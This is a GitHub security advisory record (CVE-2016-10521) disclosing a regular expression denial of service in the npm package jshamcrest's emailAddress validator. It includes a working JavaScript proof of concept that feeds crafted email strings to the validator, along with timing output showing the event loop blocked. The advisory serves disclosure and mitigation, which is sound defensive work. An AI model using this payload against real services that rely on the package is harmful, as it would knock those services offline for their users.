{
 "schema_version": "1.3.0",
 "id": "GHSA-xj62-87pg-vcv3",
 "modified": "2021-01-08T00:03:52Z",
 "published": "2019-02-18T23:38:51Z",
 "aliases": [
  "CVE-2016-10521"
 ],
 "summary": "Regular Expression Denial of Service in jshamcrest",
 "details": "The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.\n\n\n## Proof of concept\n\n```\nvar js = require('jshamcrest')\nvar emailAddress = new js.JsHamcrest.Matchers.emailAddress();\n\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1) {\n    console.log(\"COUNT: \" + i);\n    var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    emailAddress.matches(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\nIt takes about 116 characters to get a 1.6 second event loop block.\n```\n[ 1, 633084590 ]\nCOUNT: 51\nLENGTH: 116\n```\n\n# Timeline\n- October 25, 2015 - Vulnerability Identified\n- October 25, 2015 - Maintainers notified (no response)\n\n\n## Recommendation\n\nThe `jshamcrest` package currently has no patched versions available.\n\nAt this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=validator).",
 "severity": [],
 "affected": [
  {
   "package": {
    "ecosystem": "npm",
    "name": "jshamcrest"
   },
   "ranges": [
    {
     "type": "ECOSYSTEM",
     "events": [
      {
       "introduced": "0"
      },
      {
       "last_affected": "0.7.1"
      }
     ]
    }
   ]
  }
 ],
 "references": [
  {
   "type": "ADVISORY",
   "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10521"
  },
  {
   "type": "ADVISORY",
   "url": "https://github.com/advisories/GHSA-xj62-87pg-vcv3"
  },
  {
   "type": "WEB",
   "url": "https://nodesecurity.io/advisories/53"
  },
  {
   "type": "WEB",
   "url": "https://www.npmjs.com/advisories/53"
  }
 ],
 "database_specific": {
  "cwe_ids": [
   "CWE-400"
  ],
  "severity": "HIGH",
  "github_reviewed": true
 },
 "CVSS_score": "None",
 "url": "https://github.com/advisories/GHSA-xj62-87pg-vcv3"
}